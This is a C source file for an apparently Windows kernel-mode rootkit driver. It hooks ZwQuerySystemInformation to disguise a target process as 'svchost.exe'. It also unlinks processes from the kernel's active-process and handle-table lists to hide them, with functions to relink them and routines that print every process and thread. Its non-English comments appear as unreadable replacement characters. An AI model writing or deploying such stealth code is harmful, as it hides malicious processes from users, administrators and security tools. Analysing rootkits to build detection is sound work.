#include "process.h"


//-----------------------------------------------

ZW_QUERY_SYSTEM_INFORMATION glRealNtQuerySystemInformation;

//-----------------------------------------------

//-----------------------------------------------

//----------------------------------------

NTSTATUS HookZwQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass, 
	OUT PVOID SystemInformation, 
	IN ULONG SystemInformationLength, 
	OUT PULONG ReturnLength
) {
	
	NTSTATUS retStatus = STATUS_SUCCESS;
	SYSTEM_PROCESS* currentProcInfo;
	WCHAR targetName[] = { TARGET_NAME };
	BOOLEAN isFirstProc = TRUE;
	PWCHAR newNameAddr = NULL;

	++glHookCount;
	retStatus = glRealNtQuerySystemInformation(SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

#define NEW_NAME L"svchost.exe"

	if (NT_SUCCESS(retStatus)) {
		if (SystemInformationClass == SystemProcessInformation) {
			if (ReturnLength) {
				if ((SystemInformationLength - *ReturnLength) >= (sizeof(NEW_NAME) + 5)) {
					currentProcInfo = (SYSTEM_PROCESS*)SystemInformation;
					while (currentProcInfo->NextEntryDelta) {
						if (currentProcInfo->ProcessName.Length) {							
							if (!wcscmp(currentProcInfo->ProcessName.Buffer, (const wchar_t*)targetName)) {
								if (isFirstProc) {
									newNameAddr = (PWCHAR)((PCHAR)SystemInformation + *ReturnLength + 5);
									RtlCopyMemory(newNameAddr, NEW_NAME, sizeof(NEW_NAME));
								}
								currentProcInfo->ProcessName.Buffer = newNameAddr;
								currentProcInfo->ProcessName.Length = sizeof(NEW_NAME) - 1;
								currentProcInfo->ProcessName.MaximumLength = sizeof(NEW_NAME);

								isFirstProc = FALSE;
							}
						}
						currentProcInfo = (SYSTEM_PROCESS*)((PUCHAR)currentProcInfo + currentProcInfo->NextEntryDelta);
					}
				}
			}
		}
	}

	--glHookCount;

	return retStatus;
}

void DeleteFromProcessListByName(PCHAR TargetImageName){
	PLIST_ENTRY currentEntry;
	ULONG	process;
	
	currentEntry = PsActiveProcessHead->Flink;
	do{
		process = GET_PROCESS_BY_LIST_ENTRY(currentEntry);
		if(!strcmp(TargetImageName, PsGetProcessImageFileName(process))){
			DbgPrint("Find Target proc : %s\nAddr : 0x%08X\n", PsGetProcessImageFileName(process), process);
			//DbgBreakPoint();
			DeleteFromProcessList(currentEntry, process);			
			break;
		}
		currentEntry = currentEntry->Flink;
	}while(currentEntry != PsActiveProcessHead);
}

//----------------------------------------

void DeleteFromProcessListByPid(ULONG TargetPid){
	PLIST_ENTRY currentEntry;
	ULONG	process;
	
	currentEntry = PsActiveProcessHead->Flink;
	do{
		process = GET_PROCESS_BY_LIST_ENTRY(currentEntry);
		if(TargetPid == (ULONG)PsGetProcessId((PEPROCESS)process)){
			DbgPrint("Find Target proc : %d\nAddr : 0x%08X\n", PsGetProcessId((PEPROCESS)process), process);
			//DbgBreakPoint();
			DeleteFromProcessList(currentEntry, process);			
			break;
		}
		currentEntry = currentEntry->Flink;
	}while(currentEntry != PsActiveProcessHead);
}

//----------------------------------------

void DeleteFromProcessList(PLIST_ENTRY targetListEntry, ULONG targetProcess){
	ULONG	handleTableAddr;

	glTargetProcess = targetProcess;
	DeleteEntryFromList(targetListEntry);
	handleTableAddr = *GET_HANDLE_TABLE(targetProcess);
	DbgPrint("HANDLE_TABLE: 0x%08X\n", handleTableAddr); 
	if(handleTableAddr){
		glTargetHandleTable = handleTableAddr;
		DeleteEntryFromList(GET_HANDLE_TABLE_LIST_ENTRY(handleTableAddr));
	}
}

//----------------------------------------

void DeleteEntryFromList(PLIST_ENTRY TargetEntry){
	PLIST_ENTRY nextEntry;
	PLIST_ENTRY prevEntry;

	prevEntry = TargetEntry->Blink;
	nextEntry = TargetEntry->Flink;

	prevEntry->Flink = nextEntry;
	nextEntry->Blink = prevEntry;
}


//----------------------------------------

void InsertProcessEntry(){
	PLIST_ENTRY currentEntry;
	
	//DbgBreakPoint();
	currentEntry = PsActiveProcessHead;
	if(!wcscmp(TARGET_NAME, L"System")) {
		if(glTargetHandleTable){
			InsertEntryInList(PsActiveProcessHead, GET_ENTRY_PROCESS_LIST(glTargetProcess));
			InsertEntryInList(PsActiveHandleTableHead, GET_HANDLE_TABLE_LIST_ENTRY(glTargetHandleTable));
		}
	}
	else {
		InsertEntryInList(PsActiveProcessHead->Blink, GET_ENTRY_PROCESS_LIST(glTargetProcess));
		if(glTargetHandleTable){
			InsertEntryInList(PsActiveHandleTableHead->Blink, GET_HANDLE_TABLE_LIST_ENTRY(glTargetHandleTable));
		}
	}
}

//----------------------------------------

void InsertEntryInList(PLIST_ENTRY prevTargetEntry, PLIST_ENTRY TargetEntry){
	PLIST_ENTRY nextEntry;

	nextEntry = prevTargetEntry->Flink;
	prevTargetEntry->Flink = TargetEntry;
	nextEntry->Blink = TargetEntry;

	TargetEntry->Blink = prevTargetEntry;
	TargetEntry->Flink = nextEntry;
}

//----------------------------------------
//
// ������� ����������� ���������� � �������� process
//
void InfoProcess(ULONG process){

	char name[20];
	HANDLE_T pid;

    // ��� ��������
    RtlCopyMemory(name,PsGetProcessImageFileName(process),16);
    name[16] = 0;

    // ������������� ��������
    pid = PsGetProcessId((PROCESS_T)process);

    // ������� ����������
    DbgPrint("Process %p:\n",process);
    DbgPrint("%d   %s\n\n",pid,name);

    return;
}

//----------------------------------------

//
// ���������� ���������� � ���� ��������� � �������.
// ������� ���������� ������ ���������.
//
void ShowAllProcess(void){

	LIST_ENTRY *current;
	ULONG process;

    // ��������� �� ������ ������� ������ ���������
    current = PsActiveProcessHead->Flink;

    // ������� ������, ���� �� ������� � ������
    do {

        // �������� ��������� �� ��������� �������
        process = GET_PROCESS_BY_LIST_ENTRY(current);

        glTotalProcess++;

        // ������� ���������� ��� ���������� ��������
        InfoProcess(process);

        // ������� ���������� � ���� ������� ���������� ��������
        ShowAllThreadProcess(process);

        // �������� ��������� �� ��������� ������� ������
        current = current->Flink;
    }

    while(current != PsActiveProcessHead);

    DbgPrint("\nFind %d process and %d thread\n",glTotalProcess,glTotalThread);

    return;
}

//----------------------------------------

//
// ������� ����������� ���������� � ������ thread
//
void InfoThread(ULONG thread){

	HANDLE_T pid;
	HANDLE_T tid;
	ULONG process;

    // �������� ��������� �� ������������ �������
    process = PsGetThreadProcess(thread);

    // ������������� ��������
    pid = PsGetThreadProcessId((PETHREAD_T)thread);

    // ������������� ������
    tid = PsGetThreadId((PETHREAD_T)thread);

    // ������� ����������
    DbgPrint("\t\tThread %p  %d\n",thread,tid);
    DbgPrint("\t\tProcess: %p  %d\n", process, pid);
    DbgPrint("\t\tStart address - %p\n", GET_START_ADDRESS_THREAD(thread));
    DbgPrint("\t\tWin32 start address - %p\n\n", GET_WIN32_START_ADDRESS_THREAD(thread));

    return;
}

//----------------------------------------

//
// ���������� ���������� � ���� ������� �������� process.
// ������� ���������� ������ ������� ��������.
//
void ShowAllThreadProcess(ULONG process){

LIST_ENTRY *start;
LIST_ENTRY *current;
ULONG   thread;

    // �������� ��������� �� ��������� ������� ������� ��������
    start = GET_HEAD_THREAD_LIST(process);

    // �������� ��������� �� ������� �������, �������������� ������� ������
    current = start->Flink;

    // ������� ������, ���� �� ������� � ������
    do{
        // �������� ��������� �� ����� �� �������� ������
        thread = GET_THREAD_BY_LIST_ENTRY(current);

        glTotalThread++;

        // ������� ���������� ��� ���������� ������
        InfoThread(thread);

        // �������� ��������� �� ��������� �������
        current = current->Flink;
        }
    while(current != start);

    return;
}

//----------------------------------------
